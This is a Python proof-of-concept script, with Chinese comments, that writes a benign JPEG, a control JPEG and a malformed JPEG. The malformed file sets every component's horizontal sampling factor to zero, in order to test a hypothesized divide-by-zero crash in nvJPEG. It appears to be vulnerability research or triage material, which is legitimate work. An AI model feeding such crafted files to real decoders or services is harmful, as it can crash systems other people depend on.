#!/usr/bin/env python3
# 假设（主要假设，不确定）：
# nvJPEG 解析 SOF0 时未校验组件采样因子；当所有组件的水平采样因子 H=0
# （采样字节为 0x01，即 H=0,V=1）时，计算 MCU 宽度/组件宽度会除以
# max_h_samp_factor=0，触发 CWE-369 除零。
# 将每个组件的采样因子恢复为合法值 0x11（H=1,V=1）后，除数非零，
# 解码应恢复正常。若实际触发点在垂直采样、图像宽高或重启间隔等字段，
# 本 PoC 可能不触发。

import hashlib
import struct

STD_DC_LUMA_BITS = [
    0x00, 0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
]
STD_DC_LUMA_VALS = list(range(12))

STD_AC_LUMA_BITS = [
    0x00, 0x02, 0x01, 0x03, 0x03, 0x02, 0x04, 0x03,
    0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x01, 0x7D,
]

STD_AC_LUMA_VALS = bytes.fromhex(
    "01 02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 "
    "81 91 A1 08 23 42 B1 C1 15 52 D1 F0 24 33 62 72 82 09 0A 16 "
    "17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38 39 3A 43 44 45 "
    "46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 "
    "6A 73 74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 "
    "95 96 97 98 99 9A A2 A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 "
    "B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 "
    "D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 "
    "F9 FA"
)

assert len(STD_DC_LUMA_BITS) == 16
assert sum(STD_DC_LUMA_BITS) == len(STD_DC_LUMA_VALS)
assert len(STD_AC_LUMA_BITS) == 16
assert sum(STD_AC_LUMA_BITS) == len(STD_AC_LUMA_VALS) == 162


def make_dht(tc_th, bits, vals):
    payload = bytes([tc_th]) + bytes(bits) + bytes(vals)
    return b"\xff\xc4" + struct.pack(">H", len(payload) + 2) + payload


def canonical_codes(bits, vals):
    codes = {}
    code = 0
    k = 0
    for length in range(1, 17):
        count = bits[length - 1]
        for _ in range(count):
            codes[vals[k]] = (code, length)
            code += 1
            k += 1
        code <<= 1
    return codes


def bits_to_bytes(bits):
    if not bits:
        return b""
    pad = (8 - (len(bits) % 8)) % 8
    bits = bits + [1] * pad
    raw = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for bit in bits[i:i + 8]:
            b = (b << 1) | bit
        raw.append(b)

    stuffed = bytearray()
    for b in raw:
        stuffed.append(b)
        if b == 0xFF:
            stuffed.append(0x00)
    return bytes(stuffed)


def make_entropy_for_zero_blocks(n_blocks, dc_codes, ac_codes):
    out_bits = []

    def append_code(code, length):
        for shift in range(length - 1, -1, -1):
            out_bits.append((code >> shift) & 1)

    dc_code, dc_len = dc_codes[0]
    ac_code, ac_len = ac_codes[0]
    for _ in range(n_blocks):
        append_code(dc_code, dc_len)
        append_code(ac_code, ac_len)
    return out_bits


def build_jpeg(width, height, sampling_list, entropy_bits):
    out = bytearray()
    out += b"\xff\xd8"

    # APP0 JFIF
    out += b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"

    # DQT: one 8-bit table, id 0, all ones
    dqt_data = bytes([0x00]) + bytes([1] * 64)
    out += b"\xff\xdb" + struct.pack(">H", len(dqt_data) + 2) + dqt_data

    # SOF0
    nf = len(sampling_list)
    sof_data = bytearray()
    sof_data += bytes([8])
    sof_data += struct.pack(">H", height)
    sof_data += struct.pack(">H", width)
    sof_data += bytes([nf])
    for i, samp in enumerate(sampling_list, start=1):
        sof_data += bytes([i, samp, 0x00])
    out += b"\xff\xc0" + struct.pack(">H", len(sof_data) + 2) + bytes(sof_data)

    # DHT: define DC table 0 and AC table 0 with standard luminance tables.
    out += make_dht(0x00, STD_DC_LUMA_BITS, STD_DC_LUMA_VALS)
    out += make_dht(0x10, STD_AC_LUMA_BITS, STD_AC_LUMA_VALS)

    # SOS: all components use DC/AC table 0.
    sos_data = bytearray()
    sos_data += bytes([nf])
    for i in range(1, nf + 1):
        sos_data += bytes([i, 0x00])
    sos_data += bytes([0x00, 0x3F, 0x00])
    out += b"\xff\xda" + struct.pack(">H", len(sos_data) + 2) + bytes(sos_data)

    out += bits_to_bytes(entropy_bits)
    out += b"\xff\xd9"
    return bytes(out)


def main():
    width = 8
    height = 8
    nf = 3

    dc_codes = canonical_codes(STD_DC_LUMA_BITS, STD_DC_LUMA_VALS)
    ac_codes = canonical_codes(STD_AC_LUMA_BITS, STD_AC_LUMA_VALS)
    entropy_bits = make_entropy_for_zero_blocks(nf, dc_codes, ac_codes)

    sampling_legal = [0x11] * nf
    sampling_zero_h = [0x01] * nf  # H=0, V=1

    benign = build_jpeg(width, height, sampling_legal, entropy_bits)
    poc = build_jpeg(width, height, sampling_zero_h, entropy_bits)
    ctrl = build_jpeg(width, height, sampling_legal, entropy_bits)

    files = [
        ("benign", "benign_sampling11_8x8_rgb.jpg", benign),
        ("poc", "poc_h0_sampling_8x8_rgb.jpg", poc),
        ("ctrl", "ctrl_restored_sampling11_8x8_rgb.jpg", ctrl),
    ]

    plan = (
        "假设 SOF0 组件水平采样因子 H=0 使 MCU/组件宽度计算除以 hmax=0；"
        "恢复为 H=1 (0x11) 应正常。"
    )
    print(f"[F15_PLAN] {plan}")

    for role, name, data in files:
        with open(name, "wb") as f:
            f.write(data)
        digest = hashlib.sha256(data).hexdigest()
        print(f"[F15_FILE] {role} {name} {len(data)} {digest}")


if __name__ == "__main__":
    main()